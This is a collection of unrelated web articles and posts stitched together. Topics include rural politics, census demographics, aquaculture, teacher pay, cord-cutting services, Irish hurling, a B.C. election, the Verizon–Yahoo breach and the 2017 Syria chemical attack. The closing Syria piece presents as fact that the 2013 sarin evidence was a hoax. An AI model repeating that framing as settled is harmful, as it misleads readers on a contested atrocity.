I don't think it's simply solvable by money, because in fact, on a per capita basis, at least in Wisconsin, our more rural counties if anything get more than their fair share of taxpayer dollars, if you define fair share as comparing what you pay in versus what you get back. If you poured in more money, it's not necessarily the case that people in rural areas would feel like, “Now we're sitting good. Now we're getting what we deserve,” because part of what they're reacting against is that they don't see themselves in policy conversations. They don't see themselves in the news media or even popular media. They feel like all the big decisions are made in places that are very distant from their own, and that the people making decisions, whether they're people in the media industry or people in politics or in the corporate world, that those folks don't actually have any experience in rural communities, don't understand what life is like, and actually don't even like the people who live in rural communities.
That's all a good way to enter into the conversation about why many of them voted for the guy who has no rural experience and is the epitome of a city guy.
The way I understand it is that he basically said to people, “You're right to be so angry. You do deserve more, and you know what? Those people are getting more than they deserve.” He carved out different targets than Scott Walker did, for sure, but he gave people seriously concrete targets to blame, whether we're talking immigrants or Muslims or at times, city people, but that was way more subtle. I think the notion of Make America Great Again very much appeals to people who were feeling like, “There was a time when we weren't so much on the short end of the stick. The rural area's always on the periphery, but something is different now than it was when I was growing up as a kid.”
So were you not surprised by his appeal?
I was surprised. Certainly still today, his behavior, his behavior on Twitter, his behavior with women, is hugely distasteful to a lot of people in my fieldwork in these smaller communities. Yet it didn't surprise me that this significant outsider who was calling out the so-called establishment at every turn was appealing to folks who were feeling like whatever the government is doing is not working for people like me.
One of the things that you conclude is that these people don't necessarily have a small government ideology. They just, as you say, feel like resources are being misdirected. This seems to fit Trump, who didn't really preach, although he practices it, small-government conservatism. But Walker is the epitome of a small-government guy. It's an interesting contrast considering they both had success.
Walker's very steeped in small-government ideology. When he was speaking to audiences for whom that was really important, he could speak that language, but to the broader public what he was telling people was not, “We need less government because on principle government's bad,” but, “We need less government because it's clearly not working for you.” He was able to give people pretty concrete ways. He was able to sell the small government argument but on particular policy areas like this train, like public employees. I think although Walker's grander strategy is to roll back government on principle, he didn't necessarily have to make the argument for cutting back government in that way.
Have you been in touch with people that appear in your book since Trump's election, and do you have a sense of what they're thinking now, after six months?
Yeah, I have been back, and I've been in communication with almost every group. I targeted, in my fieldwork since the election, groups in rural areas who voted for Trump. Basically, what I'm hearing is a couple of things that surprise me. I think the first is just how little they actually expect him to do for their communities, which is a bit disheartening, but maybe shouldn't have been so surprising. Basically what they've said to me is, “Presidential elections don't affect us. Nothing's going to change around here, and yet at least he's going to drain the swamp, or at least he's going to stop giving all that money to this or that group of people.” The other thing that surprised me is just how—within the last couple of months—distasteful many people find his behavior on Twitter.
I've found that, too. I've found that whenever I talk to Trump voters, it's Twitter they complain about. Anyway, what you said is scary because they are right that Trump's not going to be able to deliver economic results, but what he will be able to deliver is cracking down on immigrants or lashing out at groups that a lot of rural Americas may not like.
Yes. Yes, indeed.
Image caption Hispanics became the largest minority group in 191 metro areas in 2010
New figures by the US Census Bureau show Hispanics now outnumber African Americans for the first time in most metropolitan areas.
The figures, from the 2010 Census, illustrate the growing diversity of the 366 metro areas in the US, which are home to 83.7% of the US population.
Hispanics became the largest minority group in 191 of the areas last year.
The data could influence redistricting lines in many states, where political maps are drawn based on population.
The figures released on Thursday are important for the US political process because population determines the number of members a state has in the House of Representatives.
And states draw their own district lines, often taking ethnic voting into account.
Hispanic growth
That Hispanic populations have become the biggest minority groups in an increasing number of metropolitan areas - 191, up from 159 in the 2000 Census - is in part attributed to black populations moving south, leaving behind economically troubled cities in the northern part of the country.
A greater Hispanic presence is now evident in all parts of the country William Frey, Demographer at the Brookings Institution
New metropolitan areas where Hispanic populations rose include: Chicago, Illinois; Grand Rapids, Michigan; and Atlantic City, New Jersey - all regions that will lose US House seats in the 2012 elections because of overall population changes.
Last month, the Census Bureau said the total Hispanic population in the US jumped 42% in the last 10 years to 50.5m, the equivalent of one in six Americans.
Black populations increased 11% to 37.7m, or about one in 10 Americans.
"A greater Hispanic presence is now evident in all parts of the country - in large and small metropolitan areas, in the Snowbelt [northern states] and in the Sunbelt [southern states]," William Frey, a demographer at the Brookings Institution, told the Associate Press news agency.
He added: "From now on, local, state and national politicians will need to pay attention to Hispanics rather than treating blacks as the major minority."
Tibetan Monks to Create Sand Mandala at AHC Oct. 15-18
Opening ceremony is 10 a.m. Oct. 15. (NOTE: There will NOT be a caravan from AHC to the Santa Maria Levee Trail on Friday, Oct. 18. The monks' visit will end at 3 p.m. at the gallery.)
OCTOBER 9, 2013 -- The Official Mandala Group of Tibetan Monks from the Drepung Gomang Monastery in South India will visit Allan Hancock College Oct. 15-18 to create a sacred sand mandala. In the direct lineage of His Holiness, The Dalai Lama, this special group of monks is visiting the Central Coast as part their 2013 Art Tour to the USA. Over a four-day period, they will create a five-foot-diameter mandala in the Ann Foxworthy Gallery, located in Bldg. L-South in the heart of the college's Santa Maria campus. The public is invited to view this rare and unusual demonstration of sacred Tibetan art. Tibetan crafts will also be on display.
The opening ceremony of chants, music and mantra recitation will be held at 10 a.m., Tuesday, Oct. 15, followed by the monks beginning to create the large, colorful sand mandala. Using traditional metal funnels, called chak-pur, the artists will painstakingly pour millions of grains of sand into place on a flat platform, forming an intricate diagram of the enlightened mind and the ideal world.
The finished mandala, approximately five feet in diameter, will be completed on Friday, Oct. 18. A closing ceremony will begin at 2 p.m., when the painting will be consecrated and then dismantled. This symbolizes the impermanence of all that exists. Some of the colored sands will be distributed to the audience in small bags as blessings for personal health and healing. The remainder will be swept up and ceremonially poured into a moving body of water to symbolically spread the healing energies of the mandala throughout the world. (Pictured below right: A Compassion Mandala.)
Visitors may view the daily construction of the mandala during the hours listed below. Natural-light photography is permitted.
Tuesday Oct. 15 10 a.m.-5 p.m. Wednesday Oct. 16 10 a.m.-5 p.m. Thursday Oct. 17 10 a.m.-4 p.m. Friday Oct. 18 10 a.m.-3 p.m.
The event is free, but there is a $2 daily fee to park on the Santa Maria campus.

The first animals we domesticated for food were sheep, around 9000 years ago, followed soon after by goats, cows, and pigs, and then, as recent as 2000 years ago, chickens. As human population expanded rapidly, these animals became part of a highly industrialized food system that destroys habitat, pollutes, and is unsustainable.
Now, humans are making similar mistakes in water that we made on land.
We are currently witnessing the fastest and most poorly thought out expansion of domesticated animals ever to occur—the expanding domestication of aquatic animals. Nearly 190 different countries now raise around 550 different aquatic animal species for human consumption.
Aquaculture—the farming of aquatic animals and plants for food—is the fastest growing food production system in the world. But it is growing in the wrong way. We are farming carnivores, like salmon, that need us to catch additional fish to feed them, which is putting additional pressure on wild ecosystems. We are also completely ignoring welfare concerns.
If done correctly, aquaculture could provide sustenance for our growing planet as well as reduce overfishing. But if we want to avoid repeating the same mistakes, we need to make changes now, including changing our diets generally to include more plants and fewer animals, and eating more bivalves—oysters, mussels, and clams—instead of fish, shrimps, and octopus.
We argue here for an expanded evaluation of aquaculture that would consider the industry's broad range of ecological, social, and animal welfare impacts. If these issues were taken into consideration, we would make different decisions about whether or not we should domesticate and farm aquatic animals at all and, if we do, which species we should prioritize.
In 1974, farmed aquatic life only accounted for seven percent of the officially reported quantity of aquatic animals eaten each year. The remainder was caught in the wild. However, today, farmed aquatic animals represent roughly half of what we eat each year. That's over 60 million tons, excluding aquatic plants such as seaweed.
While 253 aquatic animal species were farmed in 1986, by 2014 that number had more than doubled to 543 aquatic animal species, almost two-thirds of which are fish, that is, vertebrates (Table 1).1
Nearly 90 percent of aquaculture occurs in Asia (with China reporting over half of global production). A little more than two-thirds of aquaculture occurs in freshwater, while the remainder is farmed at sea (Table 1). The rates of domestication are occurring most rapidly for marine species.
For some species in some markets, farming, rather than fishing, now provides the vast majority of animals. Farmed Atlantic salmon, for instance, represents more than 99 percent of Atlantic salmon on the market (and two-thirds of all salmon), while farmed marine shrimps contribute to 55 percent of the total world market.
Domestication is “a long and endless process that is in its infancy for most farmed fish species.”2 Society needs to take advantage of this infancy by seriously considering a wider range of criteria for aquaculture.
Ecology
The ecological concerns associated with intensified aquaculture have received the greatest amount of research and scrutiny.
Aquaculture as it currently exists adds to the exploitation of wild fish, as additional fish must be caught to feed many of the farmed animals.3
Farming carnivorous fish (e.g., salmon, seabream, and tuna), omnivorous fish (e.g., tilapia and catfish), and certain crustaceans (e.g., shrimp) requires catching more fish to use for feed and oils.
The aquaculture industry has tried to reduce the amount of wild fish and oils in feed, but the problem is far from solved.4 While about one-third of global fishmeal production in 2012 was obtained from the trimmings and other residues from seafood processing,5 the remainder has come from capture fisheries. An estimated 27 percent of the global marine fish catch each year goes to feeding farmed aquatic species.6 The ‘forage' species (e.g., sardines, anchovies, and krill) that are caught for feed are not the only group affected—species that depend on these forage fish in the wild, such as seabirds, marine mammals, and larger finfish, are now competing with aquaculture for their food supply.7,8
Scientists have been calling for aquaculture to focus on species lower on the food web that require little to no feed (e.g., freshwater carps, bivalves, and aquatic plants) for more than 35 years, and there is widespread scientific agreement that aquaculture, among other things, must reduce its reliance on capture fisheries for feed.4, 9–11 In stark contrast to widespread scientific agreement and recommendations, the percentage of fed farmed aquatic species has actually increased since the 1980s,12 in part due to perverse market incentives, such as cheap feed. Aquaculture in the Mediterranean, for instance, has shifted toward higher trophic level species that require more, not less, fish feed.13 The trend is similar globally, with fed species accounting for an even greater percentage of production.5
The issue of the dependence of farmed aquatic species on wild aquatic food is just one of many ecological concerns. The Global Aquaculture Performance Index (GAPI) assesses finfish aquaculture across ten ecological criteria.14 In addition to the reliance on captured fish, other criteria include the sustainability of the feed, amount of energy farmed fish divert from marine ecosystems, antibiotics use, the use of chemicals, waste contamination (e.g., nitrogen, phosphorous; the pollution from finfish aquaculture in China has contributed to the poor state of coral reefs),15 farm escapees (which can interbreed, outcompete, or transfer parasites to native fish species),16 industrial energy demands, and an estimate of the pathogen rate on farms. The GAPI index is only for finfish, but there are also ecological concerns related to invertebrate farming, such as saltwater intrusion, sedimentation, pollution, disease outbreaks, and habitat loss. A recent study, for instance, compared satellite imagery from the mid-1970s to images from the present to estimate that commercial shrimp farming has led to a 28 percent decline in mangrove cover in Indonesia, Brazil, India, Bangladesh, China, Thailand, Vietnam, and Ecuador.17
This is by no means intended as a comprehensive list of the ecological impacts with aquaculture but does demonstrate the growing body of research and concern.
Food Security
In addition to the ecological impacts, aquaculture also raises social concerns, ranging from public health issues such as antimicrobial resistance (especially common in shrimp cultivation) to human rights issues such as forced labor (also common in shrimp farming), particularly in developing countries.18 Some of these issues are dictated less by the species being farmed (although admittedly some species are more suitable for certain regions of the world) than by policy and governance. One social concern that has a strong relationship with the species under cultivation is food security.
Aquaculture is often touted as a solution to food insecurity, which is used as justification for continued growth and intensification in the sector. However, aquaculture's net effect on food security is unclear. The United Nations Food and Agriculture Organization (FAO), the international organization mandated to collect global statistics on food production, states that “at present little or no hard statistical information exists concerning the scale and extent of rural or small-scale aquaculture development within most developing countries.”19
While aquaculture undoubtedly plays a role in food security in certain areas of the world, in some cases its food security benefits are greatly exaggerated. For example, the International Salmon Farmers Association released a 2015 report titled, “Salmon Farming: Sustaining Communities and Feeding the World.” In reality, most salmon farmed in Scotland stays in UK markets.20 Similarly, the British Columbia Salmon Farmers claim on their website that, “B.C. farm-raised salmon is the right choice for sustainability, food security, and our oceans.” But salmon farmed in British Columbia is a luxury food destined mainly for the food-secure markets of the EU, Japan, and North America.21
Not only is farmed salmon sold to a food-secure market, but due to its reliance on fish feed, farming salmon is also potentially exacerbating food insecurity by relying heavily on captured fish, which are often caught in developing countries (the largest fishery in the world is the Peruvian anchovy fishery, and most of the anchovies there are turned into fishmeal) and could instead be eaten by humans directly. The UN FAO Code of Conduct for Responsible Fisheries (Article II) advises that capture fisheries “promote the contribution of fisheries to food security and food quality, giving priority to the nutritional needs of local communities.”22 Under these FAO standards, the practice of feeding forage fish to farmed animals is clearly irresponsible.
Aquaculture production that truly considers food security would be concerned not only with the end use of the animals but also with the compromises to food security that occur when raising these species. As with environmental concerns, the conclusion is that we should not be farming species that rely on captured fish for feed.
Animal Welfare
In addition to asking whether and to what degree aquatic animals are likely to experience pain and suffering in general, another issue is whether and to what degree these species are likely to experience pain and suffering under cultivation in particular. As with terrestrial animal agriculture, we should raise animal welfare concerns at every step of the process, including but not limited to breeding, growth, rearing (especially related to species density and mobility), capture, handling, transport, and slaughter. The current scientific understanding is that the welfare concerns raised by these activities are likely to be much more acute for vertebrates and invertebrates such as cephalopods than for invertebrates such as bivalves, given that vertebrates and cephalopods have much more need for space and enrichment than bivalves do.26 In addition, welfare concerns will be greater for motile, migratory animals like salmon than for sessile animals like mussels. This is not to say that no welfare concerns exist for bivalves or sessile animals. But it is to say that there are fewer welfare concerns about these species groups than about others, especially in conditions of captivity.
The Solution?
Current industrial animal farming practices are designed to maximize economic benefits, with significant costs for the environment, food security, and animal welfare (among other negative impacts). Industrial aquaculture poses many of the same risks as terrestrial animal agriculture, yet because this industry is still in its early days, humans have an opportunity to chart a different, more responsible course.28 It is imperative that we take advantage of this opportunity by questioning, right now, whether or not we should be farming aquatic animal species at all and, if so, which ones.
Based on the criteria we discussed here—environmental impacts, food security, and animal welfare—what would an ideal species group look like? Quite simply: plant species. Assuming, however, that we insist on farming aquatic animals, then the answer becomes species that are as plant-like as possible. It should be a species group that does not require fish feed, does not require conversion of habitat, does not contribute to pollution, and has very little potential to be invasive. It should consist of animals who are either not likely to experience pain and suffering at all, or not likely to experience significant pain and suffering in captivity in particular—animals whose health and well-being is at least somewhat compatible with industrial methods.
In general, non-fed invertebrates are likely better than fed invertebrates or any vertebrates. Of all the aquatic animal species groups that we eat as food, bivalves appear to be the most promising in terms of minimizing ecological harm (in some cases they may even be beneficial), minimizing food security harm (as highly nutritious organisms that do not rely on outside food sources), and minimizing animal welfare concerns related to captive rearing.
Bivalve farming is not free from ecological and welfare issues. Ecological impacts are already documented in some places (e.g., some bivalve species can become invasive). In terms of welfare, granting bivalves the ability to experience pain errs on the side of caution. However, even assuming they do experience pain, they are still likely to experience less pain in captivity than other, more active animals. Yet, despite bivalves being the species group with the most promise, and the fact that their absolute numbers keep increasing, they make up less and less of total aquaculture. Bivalves accounted for almost half of global aquaculture in the 1980s, but due to the explosion in finfish farming now account for only around 30 percent.5,12 This is precisely the wrong trend if we want animal aquaculture to lead to a more food secure, sustainable, and humane future.

What are China's foreign exchange reserves?
China keeps a firm grip on the value of its currency, the renminbi. For years, that meant keeping the renminbi steady as vast amounts of the world's money flooded into the country to buy the toys, shoes, electronics and other goods it makes.
Under the rules of global finance, that flood of money should have driven up the value of the renminbi against other currencies, like the dollar. Instead, China kept the renminbi from rising as a way to help its manufacturers compete abroad. The mechanics of how it did that are complicated, but the process resulted in China holding large sums of money denominated in other currencies.
At the peak, in June 2014, the reserves totaled nearly $4 trillion. Inside China, the foreign exchange reserves have been seen as a financial cushion for times of trouble. But they have generated deep frustration in places like Washington — including from President Trump during the campaign.
Microsoft is partnering with Oculus to supply an Xbox One controller with every Oculus Rift virtual reality headset. Oculus will ship the controllers as part of its headset launch in early 2016, with the recently announced Xbox wireless adapter. Xbox chief Phil Spencer revealed the partnership on stage at Oculus' E3 press event today. "We believe we'll be able to create state of the art virtual reality experiences with the Oculus Rift on top of Windows," says Spencer. The Oculus Rift will work natively on Windows 10, and Spencer revealed Microsoft will allow Xbox One games to stream to the headset as part of the virtual cinema experience Oculus has created.
While the Xbox One controller will ship as part of the Oculus Rift headset bundle, the wireless element will require Windows 10, as Microsoft's adapter is only officially supported on its new OS. Microsoft's backing of Oculus could be seen as unusual given its HoloLens work, but it's clear the software maker wants to support accessories for gaming on its Windows platform no matter what.

It's one thing to claim that nameless, faceless government bureaucrats are overpaid. It's quite another to argue, as Jason Richwine of the Heritage Foundation and I recently have, that public school teachers are overpaid by more than 50 percent. This is real money, costing state and local governments over $100 billion annually. Our study generated significant, sometimes hysterical, pushback. But our conclusions still stand, and deliver important lessons regarding education financing and reform.
The claim that teachers are underpaid rests on a single isolated fact: that on average, public school teachers receive salaries about 19 percent less than private sector workers with bachelor's or master's degrees. But it's really not that simple. Here are eight reasons why.
1. All bachelor's degrees aren't the same. No one's surprised when a physics or finance major earns more than the person who studied medieval poetry, even if both graduate from the same college. Likewise, Education is widely held to be a less rigorous course of study, attracting below-average students but awarding the highest average GPAs of any college major. Easy grading both discourages hard work and makes it tough for schools to separate the good prospective teachers from the not-so-good ones. Prospective teachers enter college with SAT scores around the 40th percentile - meaning that about 60 percent of test-takers received higher scores - so it shouldn't be surprising if teachers' salaries after graduation salaries are around the 40th percentile as well.
2. That master's degree may not be worth much either. Many teachers have master's degrees but, as the Center for Educator Compensation Reform summarized the research, "The preponderance of evidence suggests that teachers who have completed graduate degrees are not significantly more effective at increasing student learning than those with no more than a bachelor's degree." In the private sector, you get paid more for a master's degree only if it signifies you'll be a more productive employee.
3. Teachers don't work unusually long hours. Teachers responded to our study by citing the long hours they work. But unlike studies that rely on teachers' shorter "contract hours," we used teachers' self-reported work hours - if they said they worked 60 hours, we assumed they did. But it's important to note that, based on these self-reported data as well as a detailed Bureau of Labor Statistics study, average public school teachers don't work unusually long hours - about 44 hours per week, the same as other college graduates.
4. Objective skills tests erase the teacher pay gap. Individuals' scores on standardized tests are good predictors of their future earnings, and research shows a correlation between teachers' test scores and student achievement. The National Longitudinal Survey of Youth follows individuals over time and includes a wide range of variables, including participants' scores on the Armed Forces Qualification Test, which tests math and reading ability. When we analyze salaries while controlling for AFQT scores rather than paper educational credentials, the teacher salary gaps disappear: teachers are paid right around what their AFQT scores would predict.
5. Non-cognitive skills don't make up the difference. Test scores don't capture every important job skill, such as communications, organizational and interpersonal abilities. But these skills have broad market applications, so if they're undervalued in teaching then teachers who shift to other jobs should receive a pay increase. But they don't: using data from the Survey of Income and Program Participation, we show that teachers moving to the private sector usually take a pay cut, while private workers who switch to teaching usually get a salary increase. This is the opposite of what the "underpaid teacher" theory would predict.
6. It's in the benefits. Teachers' salaries are about right, but their fringe benefits - in particular pensions, retiree health care and vacation time - are a lot more generous than the private sector, making their total benefits package worth roughly twice private levels. The average teacher makes around $55,000 in annual salary, but another $55,000 in present or future benefits.
7. They're not voting with their feet. Randi Weingarten, president of the American Federation of Teachers, asks: "If teachers are so overpaid, then why aren't more ‘1 percenters' banging down the doors to enter the teaching profession? Why do 50 percent of teachers leave the profession within three to five years...?" In fact, there's no shortage of people looking for teaching jobs. In 2000, for instance, colleges graduated almost 25 percent more Education majors than could find teaching jobs. Moreover, while many young teachers leave the profession, attrition rates drop more than half once teachers reach 10 years of service. Average public school teacher quit rates aren't dramatically different than other professions, and are only half those of private school teachers. These aren't signs that teaching jobs are considered undesirable.
8. Raising pay alone won't boost teacher quality. Economist Dale Ballou shows that better qualified teacher applicants - such as those from more competitive colleges, with higher GPAs, and specializing in subject areas such as math and science - are actually less likely to be hired than other applicants, probably because principals and superintendents are biased toward the traditional teacher education route. Ballou and Michael Podgursky show that raising pay without reforms would draw more applicants and keep older teachers from retiring, potentially lowering the quality of the teacher workforce.
Public school teachers are important and should be paid fairly. Despite conventional wisdom, their salaries are fair and their fringe benefits far outclass private sector jobs. And the overpayment of teachers isn't chicken-feed - it's a large portion of total education spending at a time when states and localities are strapped for cash. Once we acknowledge that underpaid teachers aren't the reason our education system performs poorly, we can start working on reforms that might actually put things right.
2014 has been a huge year for Cord Cutters. Many major new products have come on the market, and some have gone away. Now that 2015 is almost here, lets take a moment and look back at some of the major stories of 2014.
HBO:
The biggest story for Cord Cutters in 2014 has to be HBOs dual announcements. First, HBO announced in April that their back catalog of shows would be available on Amazon Prime. In October, HBO announced they planned to offer a subscription plan, to .
When people list reasons not to cut the cord HBO is often second, after first ranked live sports. Now, a legal way to purchase HBO without a cable subscription will open up cord cutting to millions of HBO subscribers.
Fire TV:
In April, the Kindle Fire TV was launched and immediately became the biggest new streaming set-top box to enter the market in 2014. One of its greatest attractions has been the ability to mode it and load services such as XBMC on it. Something the locked down, or power limited, Roku, Chromecast, and Apple TV have not been able to offer.
While the Fire TV market share is still small, it is steadily growing, and the new features it offers are creating new competition for cord cutters to benefit from.
Services Closed:
Not everything has been positive for cord cutters this year, as 3 popular services have closed their doors.
Aero is the most well-known service to close their doors in 2014. Sadly, it was not because of lack of users, like the others, but because a federal court order forced them to close down.
Redbox Instant, a service run by Verizon, was the most surprising closer of 2014. Citing a lack of users, and profitability, Verizon pulled the plug on the service in October. Thankfully, they did allow anyone who had purchased movies through the service to move their content to the M-Go service. If they had closed their door and permanently blocked access to all the content customers had paid for, it could have set cord cutting back, as it would have destroyed the trust many had in purchasing digital media.
The last service has not officially closed for good, but Hitbliss ended their Beta service with a promise they would be back. The service was popular with many cord cutters as it allowed them to earn credits toward purchasing content, on services like Amazon Video, by watching ads. While not everyone appreciated the service, the closure of Hitbliss is still one of the most googled stories on our site.
Sadly, since their closure in the late spring, no announcements have been made by Hitbliss and they have deleted their Facebook page. The site is still active, but is unchanged from how it looked before the service shut down. Hopefully, they will return in 2015, but it is looking unlikely at this time.
Netflix:
2014 also marked the year that Netflix became bigger than Comcast and Time Warner Cable combined. As of the first quarter of 2014, the cable companies had a combined user base of 30 million subscribers. Netflix jumped them with 35 million subscribers. This was a huge moment for the credibility of online video services as a viable business.
In the same quarter Netflix also streamed a shocking amount of data. Over 19,500,000 Terabytes of video were streamed from Netflix. If that rate of usage continued, Netflix would have streamed over 78,000,000 Terabytes of data in 2014.
Netflix also turned down a major deal to show ads on their service, to the delight of their members, as this was the third most viewed news story on our site.
Hulu:
Hulu dropped from the second largest paid video services to the third, behind Amazon Instant. In an effort to address the negative perception of the company, and lack of content, the new CEO has announced they are looking at ways to reduce the amount of ads.
Hulu also made a major move to bring in new content. At the very end of the year they announced a deal to add Discovery Networks, FX, and more ABC shows to Hulu. They had already struck a deal with CBS to offer some of their shows on Hulu in February.
The addition of new content, and hopefully a reduction in the number of ads, should make Hulu more attractive to cord cutters.
Amazon Instant:
Amazon had a huge year for their streaming service. As already mentioned, they became the second largest paid streaming service in the US. They also struck major deals with companies like HBO. In addition, Amazon put out a set top streaming box and stick.
On top of this, they brought the Amazon Instant service to Android Phones, opening up the service to millions of Android users.
Along with the good news comes the bad news of recent changes to the Amazon Season pass. In the past, season shows charged you as the shows where released. Now, some shows charge you for the whole season upfront, and deliver the shows after they are aired. We found out that with the new policy, even if you already have purchased some of the shows, you still have to pay full price for the season.
So, for Amazon Instant fans, it has been a mixed year of good and bad news.
ISPs:
It has long been a concern that ISPs will fight cord cutting by slowing down connections, thereby making streaming unreliable. In October some of these fears where, for now, put to rest as the average US download speed from Ookla Speedtest for 2014 was 30.70Mbps. In October, 2013, the average speed was just 19.67Mbps. Globally, the average download speed was 21.03Mbps, up from 15.61Mbps in October, 2013.
Some of the speed increase may come from the fact that Netflix has started to pay ISPs for better deals in order to bring their content to the ISPs customers. Hopefully, 2015 will mark a change to net neutrality rules to help prevent this practice.
Conclusion:
It has been an exciting year to be a cord cutter. 100s of thousands of cable subscribers have become cord cutters this year. Many new services have launched, and others have been announced. No longer do we hear cable companies trying to say there is no such thing as a cord cutting movement. Now, we hear cable companies talk about ways to address the cord cutting movement.
What is even more exciting is 2015 looks to be an even better year for cord cutters.

Tigers are beautiful animals, and are soon to be extinct because of hunters. People think that it is okay to hunt tigers. If we can can somebody high in society to help us, then we could go further. If we get enough votes, then we could get President Barack Obama to present it to the UN and get their support to stop this terrible thing from happening.
My previous target said "hunter of tiger furs". Thanks to some people, I have realised that we are to target those who can stop this, not those who are doing this. Thank you to all the people who see and care about these animals.

Jimmy Barry-Murphy and Brian Cody have spoken of the enormous respect they hold for each other.The two hurling greats go back over 40 years and will come face-to-face again on Sunday as managers of the Cork and Kilkenny teams that meet in the Allianz Hurling League decider."It's amazing how our whole careers have coincided, playing with Kilkenny and Cork and coaching as well. It's extraordinary how long Brian has been there. I opted out for 11 years and he's still there when I come back! I didn't envisage this situation ever arising again," JBM told the Irish Times at yesterday's press gathering in Croke Park.Cody said: "We do go back a long way, we played minor, U21 and senior hurling against each other - I never came up against him in football! Our careers have had parallels and he's back to haunt me again! He's just a sound fella, a fella you would always be happy to meet anywhere. He's straightforward and genuine, a manager that everyone in Cork is very, very happy with."Barry-Murphy reckons that inter-county hurling hasn't changed much since his last stint as Cork manager ended in 2001."The game is pretty basic, it's simply hurling skill and commitment," he continued."As the years have gone on everything is being upgraded - preparation, physical, technical, tactical. That's all very, very worthwhile but at the end of the day I think Kilkenny and Tipperary have proven over the last three or four years that the best teams get to the top. My biggest ambition always when I take over a team is to try and build team spirit. You develop a panel of players that want to play together and win together."I think if you start off with that you've a chance. If you haven't got morale in the background and team spirit, you've nothing."
The B.C. election seemed to be orbiting the Sunshine Coast last week, and the trajectory was downward for the Liberals.
It started last Thursday with a chance encounter between Leader Christy Clark and Linda Higgins of Gibsons at a meet and greet in a North Vancouver grocery store. Captured on TV cameras, the seven-minute exchange blew up into a national story.

The two women shook hands and Higgins started to say, “I would never vote for you because of what …” but Clark cut her off. “You don't have to – that's why we live in a democracy,” Clark said, and walked away with her entourage in tow.
It was the kind of pithy arrogance that used to win points for Pierre Trudeau, but the episode was presented as a major gaffe by Clark after the #IamLinda hashtag became a rallying point on Twitter for thousands of her party's detractors.
Rather than let it die, Clark's own people gave the story legs, her campaign manager and ex-husband postulating that the whole thing was an NDP setup and Higgins was “a plant.” This brilliant deduction was apparently based on a Facebook photo of Higgins with Powell River-Sunshine Coast NDP incumbent Nicholas Simons, which turned out to have been taken after the incident. Five days after the story broke, the Liberals admitted there was no evidence to back their suspicions and said they were “happy to stand corrected.”
By then, B.C. media was picking up on a New York Times report on B.C.'s International Business Assistance program, which was expanded under the Liberals, offers tax breaks to multinational corporations with meagre returns to B.C.'s economy, and operates “under a cloak of secrecy.” The story links the program to PacNet Services Ltd., listed last year by the U.S. government as “a significant transnational criminal organization.”
Taking up the “criminal” theme, a Vancouver daily reported late Wednesday: “The mother of a fentanyl victim is questioning why a B.C. politician brought a relative facing a serious fentanyl-related criminal charge onto the campaign trail.”
The “B.C. politician” turned out to be Powell River-Sunshine Coast Liberal candidate Mathew Wilson. The relative, who he “has been spotted campaigning with,” is his stepbrother, Kasimir (Kaz) Tyabji-Sandana.
Tyabji-Sandana was charged in 2015 in Calgary with importing a controlled substance, was freed on bail later that year, and his trial has been set for Sept. 11. Although the charge has not been proven in court, the story quotes a Lower Mainland woman whose 20-year-old son died last year of a fentanyl overdose at a private treatment centre in Powell River. She calls it “a slap in the face” that Tyabji-Sandana has been supporting Wilson on Facebook and has attended campaign events with his stepbrother. Wilson's campaign office reportedly responded with a statement of sympathy for the woman and notes the stepbrother is “of course” supporting Wilson, as is the rest of the family “and hundreds of other members of the community.” The legal matter is before the courts, the statement concludes.
It was the end of a tough week for Wilson. His attempt to put Simons on the spot over a missed vote in the Legislature – raised by Green leader Andrew Weaver during the televised leaders' debate – fizzled out when Simons explained that he had missed a number of votes while recovering for seven weeks from major ear surgery.
Wilson's latest assurances regarding long-term care in Sechelt triggered an avalanche of local indignation, with experienced health care workers being among his most derisive critics.
Whether all this bad publicity hurts the Liberals on election day, or has no effect because voters have already made up their minds, or even gives rise to an anti-media-hit-job sympathy vote – those are the questions.
Verizon Communications Inc. is reportedly renegotiating the terms of its acquisition of Yahoo Inc., knocking $250 million off its previous offer of $4.8 billion.
Two massive Yahoo security breaches that came to light in 2016 spurred Verizon's move, reports Bloomberg. According to its report, sources say both companies are expected to share legal culpability related to the breaches.
Those sources told Bloomberg that an official announcement of the new deal is expected within the next several weeks.
In September, Yahoo revealed a breach in which 500 million of its accounts had been compromised.

At the end of the year, the company revealed a separate hack in which data was stolen from 1 billion of its users' accounts. As with the first hack, stolen information included names, email addresses, telephone numbers, dates of birth, scrambled passwords and, in some cases, encrypted or unencrypted security questions and answers.
Earlier in 2016, Verizon announced that it was seeking to acquire Yahoo for $4.8 billion. After the revelations, several top officials at Verizon said that the hacks would likely “materially” impact that deal and result in a lower acquisition price.
Pressure is mounting from lawmakers on Capitol Hill to get answers from Yahoo on the security breaches. Last week, Sens.

For the first time since his election, president Trump is set for a direct collision course with Vladimir Putin after Russia said on Wednesday it stands by Syrian President Bashar al-Assad despite widespread popular outrage over a chemical weapons attack which the media was quick to pin on the Syrian president, in a carbon-copy of events from 2013 which nearly launched a US invasion of the middle-eastern nation, when a YouTube clip - subsequently shown to be a hoax - served as proof that Assad had used sarin gas on rebels in a Damascus neighborhood.
As reported yesterday, Western countries including the US accused Assad's armed forces for the chemical attack, which choked scores of people to death in the town of Khan Sheikhoun in a rebel-held area of northern Syria hit by government air strikes. While Washington said it believed the deaths were caused by sarin nerve gas dropped by Syrian aircraft, Moscow offered an alternative explanation, claiming the poison gas had leaked from a rebel chemical weapons depot struck by Syrian bombs.
The strike, which was launched midday Tuesday, targeted a major rebel ammunition depot east of the town of Khan Sheikhoun, Russian Defense Ministry spokesman Major-General Igor Konashenkov said in a statement. The warehouse was used to both produce and store shells containing toxic gas, Konashenkov said. The shells were delivered to Iraq and repeatedly used there, he added, pointing out that both Iraq and international organizations have confirmed the use of such weapons by militants.
The same chemical munitions were used by militants in Aleppo, where Russian military experts took samples in late 2016, Konashenkov said. The Defense Ministry has confirmed this information as “fully objective and verified,” Konashenkov added.
According to the statement, Khan Sheikhoun civilians, who recently suffered a chemical attack, displayed identical symptoms to those of Aleppo chemical attack victims.
Naturally, Syrian rebels disagreed: Hasan Haj Ali, rebel commander of the Free Idlib Army rebel group, and quoted by Reuters called the Russian statement a "lie".
"Everyone saw the plane while it was bombing with gas," he told Reuters from northwestern Syria. "Likewise, all the civilians in the area know that there are no military positions there, or places for the manufacture (of weapons). The various factions of the opposition are not capable of producing these substances."
The incident is the first time Washington has accused Assad of using sarin since 2013, when hundreds of people died in an attack on a Damascus suburb. At that time, Washington said Assad had crossed a "red line" set by then-President Barack Obama. Back then Obama threatened an air campaign to topple Assad but called it off at the last minute after the Syrian leader agreed to give up his chemical arsenal under a deal brokered by Moscow, a decision which Trump has long said proved Obama's weakness.
